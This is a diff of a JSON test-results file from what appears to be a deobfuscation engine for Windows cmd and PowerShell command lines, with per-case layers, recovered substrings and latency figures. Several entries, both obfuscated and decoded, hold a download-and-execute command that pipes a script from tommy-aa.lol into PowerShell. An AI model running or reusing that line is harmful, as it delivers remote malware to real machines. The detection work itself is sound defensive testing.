@@ -1,6 +1,6 @@
 {
   "engine_version": "0.2.0-gate2a",
-  "generated_at": "2026-09-02T09:51:58.950450+00:00",
+  "generated_at": "2026-09-02T10:04:28.929666+00:00",
   "tracks": {
     "A": {
       "status": "RUN_VIA_C",
@@ -37,34 +37,63 @@
     },
     "G": {
       "status": "RUN",
-      "gate": "2A (partial \u2014 full semantic closure is Gate 2B)",
-      "expected_layers": [
-        "cmd.caret_strip",
-        "cmd.delayed_expansion",
-        "cmd.set_reassembly",
-        "cmd.wrapper_unwrap"
-      ],
-      "actual_layers": [
-        "cmd.caret_strip",
-        "cmd.delayed_expansion",
-        "cmd.set_reassembly",
-        "cmd.wrapper_unwrap"
-      ],
-      "layers_covered": [
-        "cmd.caret_strip",
-        "cmd.delayed_expansion",
-        "cmd.set_reassembly",
-        "cmd.wrapper_unwrap"
-      ],
-      "layers_missing": [],
-      "substrings_ok": [
-        "where c*d.e?e",
-        "where c*u*r*l.e?e",
-        "where p*ell.exe",
-        "https://tommy-aa.lol/f"
-      ],
-      "substrings_missing": [],
-      "final_preview": "start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c for /f %k in ('where c*u*r*l.e?e')do %k https://tomm",
+      "gate_2a": {
+        "expected_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.set_reassembly",
+          "cmd.wrapper_unwrap"
+        ],
+        "actual_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "substrings_ok": [
+          "https://tommy-aa.lol/f"
+        ],
+        "substrings_missing": [],
+        "pass": true
+      },
+      "gate_2b": {
+        "expected_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "actual_layers": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "layers_covered": [
+          "cmd.caret_strip",
+          "cmd.delayed_expansion",
+          "cmd.for_f_semantic",
+          "cmd.set_reassembly",
+          "cmd.wildcard_exec_resolve",
+          "cmd.wrapper_unwrap"
+        ],
+        "layers_missing": [],
+        "substrings_ok": [
+          "cmd.exe",
+          "curl.exe",
+          "powershell.exe",
+          "https://tommy-aa.lol/f"
+        ],
+        "substrings_missing": [],
+        "pass": true
+      },
+      "final_preview": "start  /min cmd /v:on /k echo off&set q8k3=where cmd.exe&set r5m9=where curl.exe&set t2x7=where powershell.exe&cmd.exe /c curl.exe https://tommy-aa.lol/f|powershell.exe cmd",
       "gate_2a_pass": true
     }
   },
@@ -88,7 +117,7 @@
         "https://tommy-aa.lol/f"
       ],
       "unresolved": [],
-      "latency_ms": 0.0333840143866837,
+      "latency_ms": 0.03319396637380123,
       "notes": ""
     },
     {
@@ -110,7 +139,7 @@
         "powershell -c calc"
       ],
       "unresolved": [],
-      "latency_ms": 0.03558001480996609,
+      "latency_ms": 0.025428016670048237,
       "notes": ""
     },
     {
@@ -126,7 +155,7 @@
       "unresolved": [
         "no CMD/PS/Bash surface detected by heuristic; Plane-A codec sub-engines not yet wired (P0-1B Gate 2D)."
       ],
-      "latency_ms": 0.01042999792844057,
+      "latency_ms": 0.009440002031624317,
       "notes": ""
     },
     {
@@ -146,7 +175,7 @@
         "\"carets ^ inside quotes ^ are literal\""
       ],
       "unresolved": [],
-      "latency_ms": 0.022539985366165638,
+      "latency_ms": 0.02192897954955697,
       "notes": ""
     },
     {
@@ -170,7 +199,7 @@
         "powershell -c ipconfig"
       ],
       "unresolved": [],
-      "latency_ms": 0.03527099033817649,
+      "latency_ms": 0.036837009247392416,
       "notes": ""
     },
     {
@@ -194,7 +223,7 @@
         "cmd /c dir"
       ],
       "unresolved": [],
-      "latency_ms": 0.031050993129611015,
+      "latency_ms": 0.029875023756176233,
       "notes": ""
     },
     {
@@ -212,7 +241,7 @@
       "substr_actual": "set path=C:\\Users\\alice&dir",
       "substr_expected": [],
       "unresolved": [],
-      "latency_ms": 0.021016981918364763,
+      "latency_ms": 0.01772900577634573,
       "notes": ""
     },
     {
@@ -236,7 +265,7 @@
         "whoami"
       ],
       "unresolved": [],
-      "latency_ms": 0.0960840261541307,
+      "latency_ms": 0.07407198427245021,
       "notes": ""
     },
     {
@@ -258,7 +287,7 @@
       "unresolved": [
         "!VAR! references found but /V:ON / SETLOCAL EnableDelayedExpansion NOT declared \u2014 cmd.exe would treat these as literal."
       ],
-      "latency_ms": 0.02327800029888749,
+      "latency_ms": 0.0223120441660285,
       "notes": ""
     },
     {
@@ -278,7 +307,7 @@
       "unresolved": [
         "%USERNAME% (system env \u2014 unresolved by design)"
       ],
-      "latency_ms": 0.017144018784165382,
+      "latency_ms": 0.018623017240315676,
       "notes": ""
     },
     {
@@ -296,7 +325,7 @@
       "substr_actual": "ipconfig /all",
       "substr_expected": [],
       "unresolved": [],
-      "latency_ms": 0.013371987733989954,
+      "latency_ms": 0.013887998647987843,
       "notes": ""
     },
     {
@@ -314,7 +343,7 @@
       "substr_actual": "dir C:\\Users",
       "substr_expected": [],
       "unresolved": [],
-      "latency_ms": 0.012323958799242973,
+      "latency_ms": 0.013513024896383286,
       "notes": ""
     },
     {
@@ -332,7 +361,7 @@
       "substr_actual": "^",
       "substr_expected": [],
       "unresolved": [],
-      "latency_ms": 0.012007018085569143,
+      "latency_ms": 0.013501034118235111,
       "notes": ""
     },
     {
@@ -353,7 +382,165 @@
       "substr_actual": "set a=&",
       "substr_expected": [],
       "unresolved": [],
-      "latency_ms": 0.024361012037843466,
+      "latency_ms": 0.025268993340432644,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-01",
+      "category": "for-f",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "substr_actual": "cmd.exe /c calc",
+      "substr_expected": [
+        "cmd.exe /c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.029247021302580833,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-02",
+      "category": "for-f",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.for_f_semantic"
+      ],
+      "substr_actual": "powershell.exe -c whoami",
+      "substr_expected": [
+        "powershell.exe -c whoami"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.027705973479896784,
+      "notes": ""
+    },
+    {
+      "id": "sem-forf-negative",
+      "category": "for-f-negative",
+      "passed": true,
+      "partial": true,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "for /f %i in ('unknown-cmd') do %i",
+      "substr_expected": [],
+      "unresolved": [
+        "for /f %i in ('unknown-cmd') \u2014 inner not statically resolvable (Gate 2B leaves loop intact)."
+      ],
+      "latency_ms": 0.01886399695649743,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-01",
+      "category": "wildcard",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "cmd.exe /c calc",
+      "substr_expected": [
+        "cmd.exe /c calc"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.026847992558032274,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-02",
+      "category": "wildcard",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "powershell.exe -c ipconfig",
+      "substr_expected": [
+        "powershell.exe -c ipconfig"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.02564798342064023,
+      "notes": ""
+    },
+    {
+      "id": "sem-wild-benign-01",
+      "category": "wildcard-benign",
+      "passed": true,
+      "partial": true,
+      "benign": true,
+      "layers_actual": [
+        "cmd.wrapper_unwrap"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap"
+      ],
+      "substr_actual": "dir *.exe",
+      "substr_expected": [],
+      "unresolved": [
+        "*.exe \u2014 41 LOLBAS candidate(s): ['powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe']"
+      ],
+      "latency_ms": 0.056748976930975914,
+      "notes": ""
+    },
+    {
+      "id": "sem-tommy-aa-inline",
+      "category": "tommy-aa-closure",
+      "passed": true,
+      "partial": false,
+      "benign": false,
+      "layers_actual": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion",
+        "cmd.for_f_semantic",
+        "cmd.for_f_semantic",
+        "cmd.wildcard_exec_resolve"
+      ],
+      "layers_expected": [
+        "cmd.wrapper_unwrap",
+        "cmd.caret_strip",
+        "cmd.set_reassembly",
+        "cmd.delayed_expansion",
+        "cmd.for_f_semantic",
+        "cmd.wildcard_exec_resolve"
+      ],
+      "substr_actual": "set q8k3=where cmd.exe&set r5m9=where curl.exe&set t2x7=where powershell.exe&cmd.exe /c curl.exe https://tommy-aa.lol/f|powershell.exe cmd",
+      "substr_expected": [
+        "cmd.exe",
+        "curl.exe",
+        "powershell.exe",
+        "https://tommy-aa.lol/f"
+      ],
+      "unresolved": [],
+      "latency_ms": 0.16114296158775687,
       "notes": ""
     }
   ],
@@ -447,18 +634,63 @@
       "benign_fp": 0,
       "unresolved_total": 0,
       "pass_rate": 1.0
+    },
+    "for-f": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "for-f-negative": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "wildcard": {
+      "total": 2,
+      "pass": 2,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
+    },
+    "wildcard-benign": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 1,
+      "benign_fp": 0,
+      "unresolved_total": 1,
+      "pass_rate": 1.0
+    },
+    "tommy-aa-closure": {
+      "total": 1,
+      "pass": 1,
+      "fail": 0,
+      "benign_total": 0,
+      "benign_fp": 0,
+      "unresolved_total": 0,
+      "pass_rate": 1.0
     }
   },
   "aggregates": {
-    "semantic_total": 14,
-    "semantic_pass": 14,
+    "semantic_total": 21,
+    "semantic_pass": 21,
     "semantic_fail": 0,
-    "benign_cases": 6,
+    "benign_cases": 7,
     "benign_fp_flagged": 0,
-    "unresolved_cases": 3,
-    "latency_ms_p50": 0.023,
-    "latency_ms_p95": 0.036,
-    "latency_ms_p99": 0.096,
+    "unresolved_cases": 5,
+    "latency_ms_p50": 0.025,
+    "latency_ms_p95": 0.074,
+    "latency_ms_p99": 0.161,
     "codec_layer": "SCAFFOLD_ONLY \u2014 Plane-A sub-engines not yet wired at Gate 2A.",
     "semantic_layer": "RUN",
     "fullchain_layer": "RUN (Track G)"
